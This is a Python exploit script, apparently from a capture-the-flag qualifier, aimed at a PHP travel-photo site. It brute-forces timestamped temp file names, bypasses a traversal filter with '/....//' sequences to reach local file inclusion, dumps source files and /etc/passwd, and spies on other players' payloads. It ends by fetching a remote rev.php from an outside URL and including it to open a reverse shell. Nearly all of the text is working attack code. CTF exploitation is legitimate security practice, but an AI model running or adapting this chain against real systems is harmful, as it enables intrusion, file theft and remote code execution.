import time
import requests
import re

COOKIES = dict(PHPSESSID='c59r65m9h1n1gl56jsh80dqk47')
CTF = "https://quals.turinctf.it/"

# Standard code for making request \o/
def request(url, data={}, method='POST'):
	r = requests.request(method, CTF+url, data=data, cookies=COOKIES)
	if r.status_code == 200:
		return r.text
	return None

# Read the csrf token from the import page with a stupid regex
def read_csrf_token():
	r = request("import_travel_photos.php", method='GET')
	regex = r".*name=\"csrf\"\s*value=\"([^\"]+)\".*"
	matches = re.findall(regex, r)
	return matches[0]

# Upload our POC as a travel photo
def import_travel_photos(poc):
	token = read_csrf_token()
	payload = {'import_from': poc, 'csrf': token}
	return request("import_travel_photos.php", data=payload, method='POST')

# View our travel photo
def view_travel_photos(path):
	payload = {}
	payload['view_this_photo'] = path
	return payload['view_this_photo'], request("view_travel_photos.php", data=payload)

# Bruteforce the timestamp since the website don't leak the correct one
def brute(pyl):
	start = int(time.time())-5

	import_travel_photos(pyl)

	for t in range(start, start+10):
		path, text = view_travel_photos('/tmp/travel_photo_{}'.format(t))
		# You can also add a filter to display only your payload
		if text != 'That is not a travel photo!': # and 'url' in text:
			print("{}  {}".format(path, text))
			return path
	raise Exception("time not found")

# Include travel photos that will include our poc. Useless, see root_include: fun++;
def template_include(path):
	payload = {}
	payload['template'] = '/....//view_travel_photos.php'
	payload['view_this_photo'] = path
	#print(payload)
	return request("make_collage.php", data=payload)

# Include payload from /
def root_include(path):
	payload = {}
	payload['template'] = '/....//....//....//..../'+path
	#print(payload)
	return request("make_collage.php", data=payload)

# Spy on others payload (cause we can ._.)
def recon():
	start = int(time.time())
	epoch_time = start-50

	for t in range(epoch_time, epoch_time+50+10):
		path, text = view_travel_photos('/tmp/travel_photo_{}'.format(t))
		print("{}  {}  {}".format(start, path, text))


# Dump some source file (yolo!)
brute('make_collage.php')
brute('view_travel_photos.php')
brute('import_travel_photos.php')
brute('index.php')
brute('admin.php')

# Spy some payload
recon()

# Just a classic
print(root_include('/etc/passwd'))

# Inject our reverse shell :D
inj = brute('http://url/rev.php')
print(root_include(inj))